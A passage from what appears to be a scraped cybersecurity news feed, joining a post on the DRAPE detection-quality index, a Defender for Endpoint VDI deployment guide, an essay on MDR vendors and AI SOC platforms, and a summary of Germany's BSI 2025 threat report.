specialists. By viewing physical security through a cyber lens, organizations can better understand how real-world vulnerabilities can lead to digital or physical compromise and impact. At LevelBlue, we help our clients bridge the gap between the digital and physical worlds by assessing how building access, surveillance, and employee processes can open or close doors to cyber and physical threats.",

      "title": "Introducing the DRAPE Index: How to measure (in)success in a Threat Detection practice?",
      "summary": "Going Beyond the Cosmetics to Assess Detection Quality TLDR: In case you landed here for the takeaway only, skip to the \"What\u2019s success in a Detection practice?\" section below! Sometimes the best means for communicating is actually through a meme. Seriously, there are entire books on that! So I'm going to start this one from a meme I recently shared on LinkedIn: https://www.linkedin.com/feed/update/urn:li:activity:7392894610949414912/ You like it or not, there are countless hours spent on this sort of MITRE mapping work in organizations (and in product teams) out there. This story is based on the public and private feedback I received about using MITRE ATT&CK tactics and techniques to tag detections. Since that topic ties to the challenges of measuring detection outcomes and quality , I've decided to introduce an experiment I have been doing in that space so that I can get more feedback and improve it further. Why tagging content with MITRE's ATT&CK? There are plenty of reasons. The first is simply because people can. But you didn\u2019t come here for that, you came for another strong opinion, right? They do it because \"MITRE ATT&CK Coverage\" became a powerful marketing term in our industry. It looks great in a product demo and sounds even better when enterprise teams report it to leadership. In other words: it sells! \ud83d\udcb8 It's easy to simply slap a TTP code onto a new rule and call it a day. Even worse: nobody bothers to validate that. Still, here\u2019s what you can do as a detection engineer instead, inspired by this whole topic and how it actually connects to detection quality. The SOC doesn't care (at all) about your tags! In an enterprise-grade security monitoring practice there are simply too many signals to handle, and sometimes they are recurring. And that's why I am all-in when it comes to data analytics and leveraging aggregation, grouping, clustering, deduplication and baselines to mitigate alert fatigue while adding a dash of statistics to alerts. Despite leveraging analytics to strengthen the signal, when you group many alerts, you also aggregate a bunch of tags! Do you really think an analyst will check those during triage time? Perhaps the robots will spit out a whole MITRE ATT&CK catalog summary in your face but that's a different problem\u2026 At the end of the day, analysts couldn't care less about how you embellish your alerts. The hard truth is most analysts will simply look for alert titles/signatures assuming the alerts are already sorted by some sort of priority/severity, and then immediately jump to the attack payload (artifacts and entities). The sooner you realize those facts, the better you spend your energy and time on higher impact changes and improvements: Detection backlog management Detection testing and automation Detection performance monitoring The latter point is the focus here. What's success in a Detection practice? There are many products and services part of a Detection Engineering portfolio. Creating and maintaining detection content is certainly one of the top deliverables with the overall goal of detecting cyber threats. You may ask: what about Threat Hunting? Check my takes below: The dotted lines between Threat Hunting and Detection Engineering Navigating the crossroads of Threat Hunting & Detection Engineering Detection generate alerts, and every alert has an outcome. The obvious next step here is to understand the alert lifecycle, how an alert is triggered, investigated and in which positive bucket it eventually ends up. The last stage of such lifecycle yields the infamous true-positive (TP) or false-positive (FP) stamps, meaning the alert uncovered a potential threat or not, respectively. If you're interested in the topic of TP x FP and their benign x malicious intricacies, check Joe Slowik 's great article on that. Highlighting the main controversy \u2014 based on an illustration from Joe Slowik Note that some alerts might be discarded (duplicates, tests, invalid) or simply overlooked, ignored in the limbo. Why tracking TP rates is not enough? To track rules performance, it's not only about TP rates. When evaluating the success (or lack thereof) of a detection rule/model, which outcomes ( alert dispositions ) are important to measure? If you ask most seasoned practitioners in the field, they will simply tell you: the more TPs and the less FPs, the better. Whereas if you ask the same question to a Stats/ML guru, they will likely introduce you to a new animal: false-negative (FN). Why is that? The false-negative refers to a verified threat that was not detected . To make it more concrete for the reader just getting introduced to the concept: You as a detection engineer craft a detection rule to spot a specific threat (e.g. Kerberosting Attack ); Someone performs such attack against your monitored environment (real or simulated/emulated); Your detection fails to spot the attack. That constitutes an FN event. The question here is: is it possible to systematically track that? Some practitioners get into FNs after exposed to the concepts of Precision and Recall , widely known in the academia and used in many other industries (e.g. medical diagnosis). https://en.wikipedia.org/wiki/Precision_and_recall Striving for as many TPs as possible, the light green above, is the ultimate goal. However, in cyber threat detection that's rarely achieved without introducing some FPs (red), especially if you want to scale fast. So you need to balance the TP and FP rates, TPR and FPR, respectively. You\u2019re essentially trading off how many false alarms you can tolerate before a detection produces expected value (TP). There are exceptions for very specific atomic detectors (known, obvious bad behavior) or when a detection relies on larger attack footprint (sequences, strong compound indicators, etc). Beyond the TPs, you also need to track detection generating excessive false positives, ideally in a ranked or sorted order. Recall requires FN data points as opposed to Precision Anything outside TP/FP land is challenging to measure \u2014 especially the FNs! In reality, most teams do not track any detection performance metrics outside alert volume! That's not the case for MITRE tags though\u2026 So how to get started assuming most detection is generating some FP (noise) while eventually generating TP (signal) observations? Note that the goal is to leverage real telemetry as input, not simulated or emulated ones despite using those in testing/validation stages. The idea is to analyze real-world, SOC/SecOps output from all triaged alerts and generate a reliable metric, per detection (atomic or model/analytic). The DRAPE index score DRAPE stands for D etection R eliability A nd P recision E fficiency which is basically a unified index (score) that quantifies: Reliability \u2192 Are the detections actually finding true attacks? (TP) Precision Efficiency \u2192 Are they doing so with minimal noise? (FP) The index score can be either negative or positive with the extremes implying the following characteristics: Negative = noisy, unreliable detection. Positive = precise, efficient, valuable detection. The index is a composite measure of the individual TP/FP data points which can be used to measure detection or rule performance of a population sample (e.g. fired alerts over last 90 days). It reveals whether a rule is signal-dominant (+) or noise-dominant (\u2013) by inspecting the number of its TP and FPs alerts over a period of time. How does it work? The formula rewards rules that spots a decent amount of threats (TP) with good precision, while penalizing noisy rules, especially those that haven\u2019t yet \u201cproven\u201d themselves with enough TPs. The algorithm allow users to set the reward or penalty impact based on FP and TP counts, respectively. Disclaimer: I'm not a math wizard! I just know the basics on stats/ML and follow the right people in this space to learn more. For instance, if you are not following Joshua Neil , you should check some of his posts on the the topic of measuring detection performance. After some really fun prompt engineering sessions and a ton of experimentation, below is where I landed: DRAPE in Python (simpler than you thought, right?), editable code is below. Features Summary The formula attempts to capture the real-world tradeoff between TP and FP figures better than precision or simple raw counts. Most single-number metrics are either: too forgiving of noise (TP-heavy rules look great even when they\u2019re a FP factory), or too punishing (precision destroys high-value, high-volume rules). DRAPE models that tradeoff how detection engineers think in practice: High TP \u2192 good High precision \u2192 better Extremely noisy rules \u2192 bad Slight noise on high-value rules \u2192 acceptable A bit more on the technical side: The w parameter boosts the reward when precision is good while k controls how strongly FP negatively impacts on the penalty . The \u201czero line\u201d is around TP/FP ratio of 1:90 but it can also be tuned by tweaking the w/k parameters accordingly. The approach enables \"bands\" to be defined empirically by the user (e.g. 15 strong). How to leverage the index in the field? Many of the clients I work with use Splunk , which also serves as a nice BI/Reporting platform enabling easy dashboarding. Data geeks love to measure and rank things, and detections are no different. \u201cYou can\u2019t manage what you don\u2019t measure\u201d hits very hard when it comes to detection code, especially if you embrace custom one. I\u2019ve been experimenting with these formulas for over a year, and this version aligns more closely with reality, especially when compared to manual assessments grounded in threat-detection expertise. When starting in a new project, that's usually where I start with customers: show me what you've got and let's measure it . One of the initial deliverables is a live Rule Management Dashboard where the team can track not only volumetrics but also how each rule performs and its metadata (devel stage, author, creation, etc). In the rule breakdown section, customers can see the index score in action: Splunk Dashboard Sample: \"Score\" holds the DRAPE index value Github Project I welcome anyone interested to try it out. Below you can find how the index behaves for some interesting inputs as an example: Index score for various TP/FP data points A Github repository is available for those who want to improve it further, with SPL and Python implementations currently available. There's also a Google Colab python notebook which allows you to quickly copy/fork and quickly experiment with the algorithm. One thing worth noting here: every TP is equally weighted for simplicity, which implies that all potential threats detected (TP count measurements) will be treated the same. In case you decide to give it a try, you may consider other variables here but be aware that the more you add, the more complex it gets. For example, one could consider the following data points in the formula too: Alert/Case/Incident impact or severity 2. Asset/Identity/System criticality (most times, baked into #1) So far, the index has helped clients uncover poorly performing detections (at the bottom of the negative range) and highlight the strongest ones (at the top of the positive range). All backed up by data! Closing Notes: don't get too excited (yet)! Before you get super pumped and consider giving it a try. Below are a few challenges you must be aware of, a sort of checklist: What is a false -positive for one analyst, might actually be a true -positive for another. Make sure you agree on a definition and refer to the illustration shown earlier for better context. Once above is sorted, the SOC needs to follow a consistent process or workflow when handling the alerts, especially when it comes to the final alert status (closing or disposition code). In case you use SOAR or ITSM products as the last stop in the alert lifecycle, it's advisable to enforce a workflow such that analysts must pick a valid, known closing reason from a predefined list (dropdown). Make sure you establish some sort of peer-reviewing process by having senior analysts reviewing a sample of the alerts/cases, with particular attention to the closing code used. Lastly, collecting all the necessary telemetry and data points is not easy. The simpler your alerting framework is, the easier it becomes to link alerts to cases or tickets, and later map rules to their alert outcomes \u2014 where the real truth lies!

      "title": "MDE for Non\u2011Persistent VDI \u2014 Implementation Guide & Best Practices.",
      "summary": "1. Overview: Microsoft Defender for Endpoint (MDE) for Non\u2011Persistent VDI Non\u2011persistent VDI instances are reset or reprovisioned frequently. To ensure immediate protection and clean device inventory, MDE provides a dedicated onboarding path that calculates a persistent device ID and onboard early in the boot process. Key considerations: Use the VDI onboarding package and choose the single\u2011entry method (recommended) to avoid duplicate devices when hosts are recreated with the same name. Place the onboarding script in the golden image but ensure it executes only on child VMs (first boot) after the final hostname is assigned and the last reboot completes. Never fully onboard or boot the golden/template/replica image into production; if it happens, offboard and clean registry artifacts before resealing. Consider enabling the portal feature \u201cHide potential duplicate device records\u201d to reduce inventory noise during transition periods. 2. Stage the scripts in the Golden Image (do NOT onboard the image) Goal: Ensure early, reliable onboarding of pooled VDI instances without tattooing the master image. Download the Windows onboarding package (Deployment method: VDI onboarding scripts for non\u2011persistent endpoints). Extract and copy the files to: C\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup Configure Local/Domain GPO to run the PowerShell script at startup (SYSTEM, highest privileges). For single\u2011entry, add Onboard-NonPersistentMachine.ps1 on the PowerShell Scripts tab. Ensure the script runs only after final hostname and the last reboot in your provisioning flow to prevent duplicate objects. Example (Domain GPO scheduled task at startup as SYSTEM): Program/Script: C\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Arguments: -ExecutionPolicy Bypass -File \\srvshare\\onboard\\Onboard-NonPersistentMachine.ps1 3. Never Onboard the Golden/Template/Replica VM If the golden image was accidentally onboarded (Sense service started), you must offboard and clean before resealing: sc query sense del \"C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Cyber\\*.*\" /f /s /q reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows Advanced Threat Protection\" /v senseGuid /f Run the official offboarding script for your tenant before cleanup, when available. 4. (Optional) Tag Devices Automatically from the Image Tags simplify scoping of device groups and policies. Add a DeviceTagging registry value during image build: reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection\\DeviceTagging\" /v Group /t REG_SZ /d \"VDI-NonPersistent\" /f Tag appears after device info refresh; a reboot accelerates reporting. 5. Performance & AV Configuration for VDI (Important) 5.1 Shared Security Intelligence & Cache Maintenance Purpose: Reduce CPU and disk spikes at sign\u2011in by offloading unpackaging of definitions to a shared source and by pre\u2011running cache maintenance on the master image. Step\u2011by\u2011step GPO configuration: Create a secure UNC share for definition packages (e.g., \\srvshare\\WDAV-Update) and grant read to VDI computer accounts. GPO \u2192 Computer Configuration \u2192 Administrative Templates \u2192 Windows Components \u2192 Microsoft Defender Antivirus \u2192 Security Intelligence Updates \u2192 Enable \u201cDefine security intelligence location for VDI clients\u201d and set \\srvshare\\WDAV-Update. In the same node, set update cadence (daily time) and enable randomization to avoid I/O storms. PowerShell examples: Set-MpPreference -SignatureUpdateInterval 4 Set-MpPreference -SignatureFallbackOrder \"InternalDefinitionUpdateServer|MicrosoftUpdateServer\" Run Windows Defender Cache Maintenance on the golden image before sealing: schtasks /Run /TN \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" 5.2 FSLogix Exclusions Why exclusions matter: FSLogix mounts user profiles as VHD/VHDX files. Scanning these at attach/detach causes logon delays, black screens, and app launch slowness. Paths and extensions to exclude: %TEMP%\\*.VHD %TEMP%\\*.VHDX %Windir%\\TEMP\\*.VHD %Windir%\\TEMP\\*.VHDX \\\\ \\ \\*.VHD \\\\ \\ \\*.VHDX \\\\ \\ \\*.VHD.lock \\\\ \\ \\*.VHD.meta \\\\ \\ \\*.VHD.metadata \\\\ \\ \\*.VHDX.lock \\\\ \\ \\*.VHDX.meta \\\\ \\ \\*.VHDX.metadata GPO: Computer Configuration \u2192 Administrative Templates \u2192 Windows Components \u2192 Microsoft Defender Antivirus \u2192 Exclusions (File/Folder and Extension). PowerShell examples: Add-MpPreference -ExclusionExtension VHD,VHDX Add-MpPreference -ExclusionPath \"C:\\ProgramData\\FSLogix\",\"\\\\storage\\fslogix-share\\*.VHD*\" 5.3 General Scan Posture Real\u2011time & cloud\u2011delivered protection (GPO): Enable Real\u2011time protection, Cloud\u2011delivered protection, Join MAPS, and \u201cBlock at first sight.\u201d Scheduled scans (GPO): Daily Quick Scan (e.g., 02:00) with randomization window. Weekly Full Scan (e.g., Sunday 03:00). Consider \u201cStart the scheduled scan only when computer is on but not in use\u201d to reduce user impact. CPU throttling settings: Set-MpPreference -ScanAvgCPULoadFactor 30 # 5..100 (0 = no throttling) Additional scheduling/throttling options (Intune/Policy CSP as applicable): ScanOnlyIfIdleEnabled = True DisableCpuThrottleOnIdleScans = True ThrottleForScheduledScanOnly = True EnableLowCPUPriority = True Validation commands: Get-MpPreference | fl ScanAvgCPULoadFactor,ScanScheduleQuickScanTime,SignatureUpdateInterval Get-MpComputerStatus | fl AMServiceEnabled,AntivirusSignatureVersion,RealTimeProtectionEnabled 6. Validate Onboarding After first boot of a pooled VM, verify device appears in Defender portal (Assets \u2192 Devices). For single\u2011entry method, reboot/redeploy a few instances with the same hostname and confirm one device object is reused. Optionally enable \u201cHide potential duplicate device records\u201d (Settings \u2192 Endpoints \u2192 Advanced features). This is like only filtering the view of Devices list does actual remove the records from the MDE portal. Run a detection test if needed (per Microsoft guidance) to verify sensor connectivity. 7. Quick Checklist \u2014 Build Step Download VDI onboarding package from Defender portal. Copy scripts to Startup folder in golden image; configure GPO/Task to run PS1 at boot as SYSTEM. Do NOT onboard/boot the golden image into production; if it happens, offboard + clean senseGuid & Cyber cache. (Optional) Set DeviceTagging registry value for scoping (e.g., VDI-NonPersistent). Configure Shared Security Intelligence path; schedule updates; run Cache Maintenance on master image. Apply FSLogix AV exclusions (paths + extensions). Set scan posture (RTP + cloud, schedules, CPU throttling). Validate onboarding behavior and inventory cleanliness. 8. Summary & Best Practices Checklist for golden image: Script staged, not executed on master; executes only on child VMs at final boot stage. Shared Security Intelligence path configured; cache maintenance pre-run. FSLogix exclusions present prior to first user logon. RTP and cloud protection enabled; scans scheduled with randomization; CPU load factor tuned. Common pitfalls & fixes: Golden image onboarded \u2192 Offboard + clean registry/cache; reseal. Script runs before final hostname \u2192 Duplicate device records. Delay script until last reboot/final rename. No exclusions for FSLogix \u2192 Long logons/black screens. Add VHD/VHDX exclusions and share paths. Simultaneous scans across hosts \u2192 Enable randomization; schedule during off\u2011hours.

The Big MDR Squeeze Most MDR vendors have already figured out how to scale basic threat detection and triage, but these capabilities, once a unique selling point, are now widely available from a range of providers, with better platformization (think Defender, Palo style platform of platforms), or with the constant pressure of agentic-first SOC platforms that promise a horizon where SOC grunt work is turned into another, more agile platform. Our thesis is that to stand out, not only MDR vendors must provide continuous detection coverage value, they also need to demonstrate additional value further down the attack value chain \u2014 and find value that is harder to commoditize. From detection to response, the older sweetspot for MDR is shrinking, with better tools, skills and approaches. There is still plenty of value to be offered, and MDR can stay relevant : but it has to evolve with customers But scaling analysis and response, whether AI SOC or MDR, is inherently complex. It demands new processes, technologies, and skill sets. Cloud infrastructures are becoming more uniform, and many platforms allow for host isolation, revoking user sessions, or blocking applications from a single console. These capabilities expand what MDR services can deliver but also raise customer expectations. MDR providers must first ensure that they resolve two sides of the SecOps equation : They are running a tightly managed detection coverage suite, and have sufficient analysis capabilities to compress signals to the most urgent incidents to resolve They correctly identify and perform active response, integrating their customers unique context and guardrails. However\u2026 is that anything that an agentic SOC platform of the future won\u2019t offer ? Today, AI SOC platforms simply don\u2019t do a great conceptual job at addressing the detection coverage part. So there might be a real opportunity here for MDR providers who see this value proposition ahead of the curve. AI SOC tech companies continues to promise scaling capabilities for analysis and response, which forces us to think about an potential future scenario. That begs the question\u2026 are AI SOC Providers positioning to become the MDR of the future ? Wait\u2026 so why wouldn\u2019t MDR be able to scale as quick as those AI SOC providers ? Adding personnel alone does not scale in the MDR model. Tools must enable analysts to shift from producing analysis to validating automated conclusions. SecOps is facing transformative shifts with the emergence of AI. AI-based approaches aim to replace many time-consuming tasks for human analysts. Specialized agent-based AI can process large volumes of low-fidelity but often still relevant alerts, such as phishing attempts, man-in-the-middle attacks, identity-based events, or token theft. It\u2019s still grunt work, but happening within background jobs at a more consistent level of quality. With this change, the analyst role will be disrupted. Analyst skills will always be relevant, but within engineering profiles focused on creating analysis platforms around AI SOC capabilities. New discoveries will be codified into guidelines. Investigative searches will migrate from written playbooks to tool calling. Alert \u201ctuning\u201d will happen within the LLM layer itself when it can\u2019t be sufficiently codified in the rule query. Today\u2019s SOC analysts will become tomorrow\u2019s Detection and Response Engineers, only intervening asynchronously on escalated incidents \u2014 not alerts \u2014 from their stack. This frees time to improve platforms, content, automations, and overall service quality. In leading SOCs, even without AI, this change has already been happening, with organizations outsourcing L1/L2 services and volume-based contracts for set periods until they feel their operations are under control. Switching to a technology to scale analysis at the same place seems like the next logical step. Whether agentic AI will deliver on its promise and allow for reshaping of MDR and SOC operations is still to be determined. What is clear today is that MDR will need to address the hard problems in scaling analysis and response safely to stay relevant. Because there\u2019s another challenge: MDR current platforms are already not always sufficient to adapt to existing customer changes, especially when they consolidate data into SecOps platforms, away from the MDR data lake of yesterday. Data is not king anymore. It\u2019s all about orchestration now. MDR is not consistent \u2014 typically, they ingest something from the customer, and escalate back incident. But in terms of implementing something in the middle, approaches vary wildly, but do concentrate around 3 approaches. Run a SIEM technology, like Elastic or Splunk, centralizing all customer data. They then run detections and reporting on top of it with the built-in tools. Build a hyperscale non-security focused data lake, like Google BigQuery or Snowflake, then build a detection engine around it (usually some orchestrator running queries) Focus on supporting specific platforms, like Microsoft Defender/Sentinel, that they can manage in a multi-tenant mode natively. Usually, the platform is owned by the customer. For years the standard \u201cagnostic\u201d model has typically followed a \u201cingest everything into the MDR\u2019s platform and deliver value from there. This doesn\u2019t fit anymore. Data gravity, sovereignty, egress costs, and latency make large-scale replication both expensive and slow. Just as important: the most actionable context now lives inside the customer\u2019s own platforms and cloud services. Customers\u2019 increasing availability of SecOps platforms signals a significant shift for MDR vendors. They are now accustomed to transparent deliverables. This also fits the growing narrative that customers want partners who enable their investments where they are \u2014 not a service delivered outside their own ecosystem. A SecOps Mesh Architecture MDR has to shift to a distributed delivery model where the data and detection capabilities stay within the customer environment, and MDR providers act as orchestrators across distributed threat signals. The real differentiator will be MDR vendors who can deliver core MDR capabilities in a distributed way: Operate-in-place capabilities: runbooks, response actions, and content executed natively in the customer\u2019s tools. Zero-copy detections: analytics and correlations that query in place via APIs, not bulk ETL. Alternatively, leverage the platform\u2019s own management offerings. A federated control plane: one view for posture, detections, cases, and response across multiple customers and their back-end technology. Content-as-code: versioned detections, playbooks, and integrations that are portable across Microsoft, Google, Palo Alto, CrowdStrike, SentinelOne, etc. We believe that the MDR platform of the future, is a technology agnostic control plane. Not a data lake, not a vendor lock-in play. A central platform with the ability to deploy/onboard any platform at a customer, centrally manage detection content, and aggregate signals in a distributed fashion for additional processing. Distributed data, centralized signals, hyperscale analysis. Standard approach today : Send your data, gets escalated alerts back from the MDR provider MDR becomes the orchestrator and accelerator of the customer\u2019s platform, not a competing platform. Centralized ingestion isn\u2019t the product anymore - outcomes are. Future Platform : Customer Platforms (SIEMs, EDRs, etc.) manage the data, the MDR provisions or manage them, deploys detections, retrieve escalated events and process them further before raising incidents to the customer Is the future MDR platform a single plane of data and control ? The short answer is yes. There\u2019s nothing technically challenging about performing API integration to deploy detections and collect alerts centrally before performing analysis (AI or not), and last-line response. There are plenty of identity federation approaches to support integrating a large number of customer platforms. It\u2019s not the standard architecture yet because of lack of foresight, and existing success in integrating customer data. The long answer is that it\u2019s not a clear path for the largest MDRs because of existing investments in scaling, the difficulty of re-architecting, poorly designed platform APIs, and customers who may find it difficult to integrate differently if they already have all their data at a third party. Today, most success in performing multi-tenancy in a \u201cplatform\u201d way comes from using the customer platform capabilities itself, like Azure Lighthouse, or specific EDR technologies supporting partner integration natively. An MDR control plane that enables the MDR to deliver its core competencies and focus on delivering contextual capabilities for customers will thrive. This architecture also needs, alongside deploying detection content quicker and at scale, to facilitate analysis and response in its core capabilities. Enrichment and investigation must be facilitated in a distributed ecosystem (think launching enrichment searches ad hoc, targeting a remote SIEM), but presented centrally for visibility. There should be a clear portal for both MDR employees and customers, perhaps completely transparently, so customers can see ongoing investigations at any time. Isn\u2019t that SOAR all over again ? SOAR promise was indeed, to orchestrate and analyse. It\u2019s in the name ! But in reality, the industry only developed more complex case management tools, and strapped a workflow builder on top. They didn\u2019t scale analysis, they didn\u2019t address detection coverage/engineering needs, and as a result, their impact was just not sufficient . So while some MDRs used SOAR and had results, we believe that those results were only met around integration needs, and didn\u2019t sufficiently innovate when it comes to scaling analysis and performing automated investigations. AI SOC is already the start of a new type of control plane Those platforms aim at integrating tools and performing analysis. They may not orchestrate content well today, but they do interact with tools consistently to pull in alerts, execute actions, and perform enrichment. If AI delivers on even part of its promise, analysts move toward validator roles. The whole SOC model gets disrupted quicker \u2014 L1/L2/L3 makes no more sense. We\u2019d see consolidation around Engineer roles and ad-hoc Responders, and the rug would be pulled out from under traditional MDR vendors. Early adopters will see efficiency gains. MDR vendors then have a choice to adopt it . If they don\u2019t, they risk becoming less competitive. If they do, they could reduce their costs and decide to take the margin, reinvest, or reduce their margins to be more price-competitive. But they\u2019d fight in the same market with the category they\u2019re using. Or they develop their control plane, and use their own AI SOC platform in a more complete, and unique service offering. Why pay a large fee for a big MDR when an AI SOC can cover SOC analysis at a lower price, allowing customers to invest in the rest of their stack.. but not MDR ? The MDRs that survive this squeeze will be the ones that offer clear outcomes. Strong context. Clean integration. Human validated decisions. And response the customer can see and trust.

      "summary": "Germany Threat Landscape \" data-image-caption=\"\" data-medium-file=\"https://cyble.com/wp-content/uploads/2025/11/Germany-Threat-Landscape-300x150.webp\" data-large-file=\"https://cyble.com/wp-content/uploads/2025/11/Germany-Threat-Landscape-1024x512.webp\" title=\"Germany Urges Attack Surface Management Adoption as Routinely as Antivirus Protection 6\"> The Federal Office for Information Security (BSI) released its 2025 report on the state of IT security in Germany, and the verdict is unequivocal: there is no all-clear. Despite notable law enforcement successes against major cybercrime groups, Germany's IT security situation remains \"tense.\" The culprit? Inadequately protected attack surfaces that continue to provide easy entry points for threat actors, BSI noted. For the first time, the BSI, through its findings, said that while threats have somewhat stabilized, poorly managed attack surfaces are keeping risk levels dangerously high. Most concerning is that 80% of reported attacks now target small and medium-sized enterprises (SMEs)\u2014organizations that often lack the resources and expertise to defend themselves effectively. Statistical Snapshot Threats Positive developments: International law enforcement operations disrupted major cybercrime groups like LockBit and Alphv, greatly reducing their activity. Botnets: Badbox and Vo1d were the most active globally. The BSI participated in takedown operations through sinkholing measures. Phishing and malware: Over 800 malicious websites per day were detected, though their average lifespan decreased to under two hours, showing faster countermeasures. Attack Surface Web-based vulnerabilities remained alarming, with 119 new software vulnerabilities identified daily (+24% year-over-year). Many public-facing systems remained unpatched, posing risk. Germany had 13.2 million reachable [.]de domains, with 47 million vulnerable server services detected. The report urges organizations to adopt attack surface management as routinely as antivirus protection. Attacks Cyber espionage: Government institutions were the main target of APTs. Ransomware: Around 950 reported cases, with 72% involving data leaks. Exploitation attacks increased 38% from the prior year. 80% of reported cyberattacks targeted small and medium-sized enterprises (SMEs) due to limited resources and cybersecurity know-how. Critical infrastructure (energy, transport, healthcare, finance) reported dozens of cyber incidents. Impact Data leaks surged to 461 incidents involving German institutions. Leaked data included: Birth data (92%) Physical addresses (72%) Email addresses (63%) Passwords, financial, and health information Ransom payments decreased in frequency, but the average ransom amount reached an all-time high. IoT devices (like Android smart gadgets) became a growing infection source\u2014many shipped already compromised. 30,000 BadBox-infected and 10,000 Vo1d-infected devices were mitigated via BSI coordination. Resilience The BSI enhanced its monitoring and certification: 413 Common Criteria certificates issued (105 new in 2025). 8,622 organizations joined the Alliance for Cyber Security . Incident management maturity (KRITIS operators): ISMS maturity is mostly at levels 3\u20134. BCMS maturity is improving. Public awareness remains mixed: Citizens know on average 6.1 protection measures, but use only 3.8. Many find measures \"too complicated\". Common protections: strong passwords, 2FA, password managers. The BSI\u2019s service center handled ~10,500 citizen inquiries on cybersecurity in 2025. The Numbers Tell a Sobering Story Germany's web attack surface in Q2 2025 comprised approximately 13.2 million [.]de domains accessible from the internet. Of these, 8.1 million domains were reachable via both IPv4 and IPv6, while 5.1 million were accessible only through IPv4. This massive digital footprint represents an enormous challenge for security teams trying to maintain visibility and control. The vulnerability landscape has intensified significantly. An average of 119 new vulnerabilities in IT systems were discovered daily during the reporting period\u2014a 24% increase compared to the previous year. This relentless pace of vulnerability disclosure, driven partly by changed reporting policies but also by the growing complexity of software systems, means that organizations face an ever-expanding list of potential weaknesses to address. Meanwhile, exploitation attempts have surged. The BSI's MADCAT honeypot measurements showed a 38% increase in exploitation attacks compared to the previous reporting period. Attackers aren't just probing systems\u2014they're actively exploiting weaknesses at an accelerating rate. The Cybercrime Landscape in Germany: Stabilization Without Relief The threat landscape showed some positive developments during the reporting period. International law enforcement actions against major ransomware operations led to a degree of stabilization. LockBit and AlphV, two previously dominant ransomware groups, were substantially disrupted. This represents a significant victory for coordinated international cybercrime enforcement. However, stabilization doesn't mean elimination. Germany ranked third globally among cybercrime group targets at 64%, behind only the United States (94%) and the United Kingdom (71%). The cybercrime ecosystem has proven remarkably resilient, with new groups emerging to fill the void left by disrupted operations. RansomHub, Clop, Akira, Qilin, and Play were among the most active groups during the reporting period, continuing the trend of Ransomware-as-a-Service that makes sophisticated attacks accessible to less skilled criminals. The data leak situation has reached alarming levels. During the reporting period, 461 data leaks affected German institutions and consumers. The most commonly compromised information included birth dates (92% of leaks), physical addresses (72%), and email addresses (63%). More sensitive data, such as passwords (36%), payment information (22%), and health data (18%) were also frequently exposed. The IoT Botnet Threat Perhaps one of the most disturbing revelations in the BSI report concerns IoT botnets, particularly BadBox and Vo1d. BadBox became the largest active botnet in Germany, with up to 58% of infected systems in the country attributed to this single operation. What makes BadBox especially concerning is that devices were infected during the production phase\u2014before they ever reached consumers. This represents a fundamental shift in the threat model. Traditional security advice assumes that devices are secure when purchased and become compromised through user behavior or software vulnerabilities. BadBox demonstrates that supply chain compromises can deliver pre-compromised devices directly to consumers and businesses, who have no practical way to detect the infection. The BSI responded through sinkholing operations, redirecting communication attempts from infected devices to BSI-controlled servers to prevent further malicious activity. Approximately 30,000 BadBox-infected IoT systems had their communications blocked, and device owners were notified. An additional 10,000 Vo1d-infected device owners received similar notifications. While these remediation efforts represent important defensive actions, they're reactive measures addressing infections that have already occurred. The SME Vulnerability Gap The statistic that should alarm every business leader in Germany: approximately 80% of reported attacks targeted SMEs. This isn't a random distribution\u2014it's a deliberate strategic shift by attackers toward softer targets. The dynamics are straightforward. Large enterprises have dedicated security teams, substantial budgets, and often sophisticated detection and response capabilities. Attacking them requires significant resources and expertise, with no guarantee of success. SMEs, conversely, often operate with limited IT staff, minimal security budgets, and gaps in both technical controls and security awareness. For cybercriminals conducting cost-benefit analyses, SMEs represent the optimal target: easier to compromise, less likely to detect attacks quickly, and numerous enough to provide a steady stream of victims. The attack pattern reflects this calculation. Rather than pursuing complex, targeted attacks against well-defended enterprises, threat actors increasingly favor volume-based approaches, hitting many SMEs with relatively simple techniques. Ransomware attacks have become particularly effective against this segment, with 72% of the 950 reported ransomware incidents involving data leaks used to pressure victims into paying. Interestingly, while ransom payment rates continued their multi-year decline\u2014dropping to just 26% in Q2 2025 compared to 85% in Q1 2019\u2014the average ransom payment reached all-time highs. This suggests that while fewer victims are paying, those who do pay are facing substantially larger demands, particularly when data leakage is involved. Attack Surface Management: The Missing Link The BSI's conclusion is direct and unambiguous: \"Protection of attack surfaces is the decisive lever for improving cybersecurity in 2026.\" This isn't merely one recommendation among many\u2014it's identified as the critical factor that will determine whether Germany's cybersecurity situation improves or continues to deteriorate. The data support this assessment. Of the accessible IP addresses in Q2 2025, approximately 791,722 showed exposed metadata\u2014potential indicators of security weaknesses. Known vulnerabilities in perimeter systems are patched too late or not at all far too often. Web attack surfaces, in particular, show a \"worrying state\" that requires more professional attention through effective attack surface management. The federal administration provides a microcosm of the challenge. An average of 684,000 active email addresses existed in federal networks daily, along with approximately 1,480 active social media accounts (with high numbers of unreported cases due to private employee accounts). Daily accessible IP addresses of the federal administration with suspected vulnerabilities ranged from zero to over 300 depending on severity level. Even well-resourced government agencies struggle to maintain complete visibility and control over their attack surfaces. The BSI argues that attack surface management must become as routine as antivirus software for email. This represents a fundamental shift in thinking\u2014from treating attack surface visibility as an occasional audit activity to recognizing it as a continuous operational necessity. The Resilience Gap Germany has made substantial investments in cybersecurity awareness and capability building. The Alliance for Cyber Security has grown to include 8,622 companies and institutions. The BSI issued 41 cybersecurity warnings during the reporting period and provided 3,871 reports through its Warning and Information Service. Critical infrastructure operators continue to make progress in implementing Information Security Management Systems (ISMS) and Business Continuity Management Systems (BCMS), with maturity levels steadily improving. Yet awareness hasn't translated to sufficient action, particularly among vulnerable groups. Consumer surveys revealed a troubling gap: respondents knew an average of 6.1 protection measures but actually used only 3.8. Both awareness and usage of protection measures declined in 2025. Many respondents cited finding the measures too complicated, suggesting that even when people know what to do, friction in implementation prevents effective security practices. The federal administration saw some positive trends, with daily malware attacks via email declining slightly from 772 to 753. However, blocked access attempts to malicious websites increased by 23%, from 9,212 to 11,330 daily attempts. The threat isn't decreasing\u2014it's shifting to channels where defenses may be less mature. From Awareness to Protection The BSI report makes clear that incremental improvements won't suffice. Every organization\u2014regardless of 